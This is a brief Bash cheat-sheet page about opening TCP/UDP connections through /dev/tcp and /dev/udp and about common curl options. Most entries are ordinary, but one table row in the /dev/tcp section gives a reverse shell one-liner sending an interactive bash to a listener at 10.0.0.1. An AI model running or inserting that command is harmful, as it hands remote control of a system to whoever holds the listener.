# 🌐 Networking in Bash

> Open TCP connections from pure Bash and make HTTP requests.

**Bash Scripting** · **2** commands · **7** parameters  ·  [⬅ Back to index](../README.md)

<a id="commands"></a>

| Command | What it does |
|:--|:--|
| [`/dev/tcp/$ip/$port`](#cmd-dev-tcp-ip-port) | Special Bash path that opens a TCP connection to an IP and port as if it were a file, no netcat needed |
| [`curl`](#cmd-curl) | Sends requests to a URL from the terminal (HTTP, HTTPS, etc.) and shows the response |

---

<a id="cmd-dev-tcp-ip-port"></a>

## `/dev/tcp/$ip/$port`

Special Bash path that opens a TCP connection to an IP and port as if it were a file, no netcat needed

```bash
echo '' > /dev/tcp/127.0.0.1/22 && echo "open"
```

| Parameter | What it does | Example |
|:--|:--|:--|
| `/dev/udp/$ip/$port` | Same pseudo-device for UDP; both only work in Bash, not in zsh | `echo '' > /dev/udp/192.168.100.1/53` |
| `bash -i >& ... 0>&1` | Reverse shell one-liner: sends an interactive bash to a listener | `bash -i >& /dev/tcp/10.0.0.1/443 0>&1` |

<sub>[⬆ Back to top](#commands)</sub>

---

<a id="cmd-curl"></a>

## `curl`

Sends requests to a URL from the terminal (HTTP, HTTPS, etc.) and shows the response

```bash
curl -s -X GET https://example.com
```

| Parameter | What it does | Example |
|:--|:--|:--|
| `-s` | Silent mode: hides the progress bar and error messages | `curl -s https://example.com` |
| `-X GET` | Sets the request's HTTP method (GET, POST, PUT...) | `curl -s -X GET https://example.com` |
| `-o` | Where to save the output (/dev/null to discard the body) | `curl -s -o /dev/null -w "%{http_code}" https://site` |
| `-w` | Chooses what to print, e.g. %{http_code} for the HTTP code | `curl -s -o /dev/null -w "%{http_code}" https://site` |
| `--connect-timeout` | Sets a maximum time to connect | `curl --connect-timeout 2 http://ip` |

<sub>[⬆ Back to top](#commands)</sub>
